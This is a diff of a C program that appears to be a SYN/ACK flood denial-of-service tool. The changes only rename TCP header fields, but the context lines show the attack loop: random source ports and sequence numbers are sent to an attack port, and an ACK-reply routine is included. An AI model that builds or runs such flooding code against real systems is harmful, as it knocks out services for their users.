@@ -5,11 +5,10 @@ int tcp_flag; //ako je podesena na 0 bice obican SYNFLOOD
 
 #pragma pack(push)
 #pragma pack(1)
-
 struct ip_header
 {
     unsigned char version_ihl;
-    unsigned char type_of_serv;
+    unsigned char type_of_service;
     uint16_t length;
     uint32_t scnd_line;
     unsigned char ttl;
@@ -22,8 +21,8 @@ struct ip_header
 
 struct tcp_header
 {
-    uint16_t src_port;
-    uint16_t dest_port;
+    uint16_t source_port;
+    uint16_t destination_port;
     uint32_t seq;
     uint32_t ack;
     uint16_t off_res_flags;
@@ -140,7 +139,7 @@ void* process_incoming(void* arg)
             {
                 printf("[d] Got %d byte TCP packet from %s\n", count, inet_ntoa(src_addr));
                 printf("[d]\t SEQ: %lx    ACK: %lx\n", (long)ntohl(tcp->seq), (long)ntohl(tcp->ack));
-                printf("[d]\t SRC: %d     DST: %d\n", (int)ntohs(tcp->src_port), (int)ntohs(tcp->dest_port));
+                printf("[d]\t SRC: %d     DST: %d\n", (int)ntohs(tcp->source_port), (int)ntohs(tcp->destination_port));
                 printf("[d]\t IP CHECKSUM %lx   TCP CHECKSUM %lx\n", (long)ip->checksum, (long)tcp->checksum);
                 printf("[d]\t FLAGS: ");
                 if(urg)
@@ -209,8 +208,8 @@ void send_ack(unsigned char *packet)
 
     unsigned char reply[sizeof(struct tcp_header) + MAX_PAYLOAD_SIZE];
     struct tcp_header *ack = (struct tcp_header*)reply;
-    ack->src_port = synack->dest_port;
-    ack->dest_port = synack->src_port;
+    ack->source_port = synack->destination_port;
+    ack->destination_port = synack->source_port;
     ack->ack = synack->seq; // Only add 1 if it's a synack (done below)
     ack->seq = synack->ack;
     
@@ -261,8 +260,8 @@ void* send_packet(void* arg)
 
     while(1)
     {
-        tcp.src_port = (rand() & 0xFFFF) | 0x8000;
-        tcp.dest_port = htons(globalArgs.attack_port);
+        tcp.source_port = (rand() & 0xFFFF) | 0x8000;
+        tcp.destination_port = htons(globalArgs.attack_port);
         tcp.seq = htonl(rand());
         tcp.ack = 0;
 
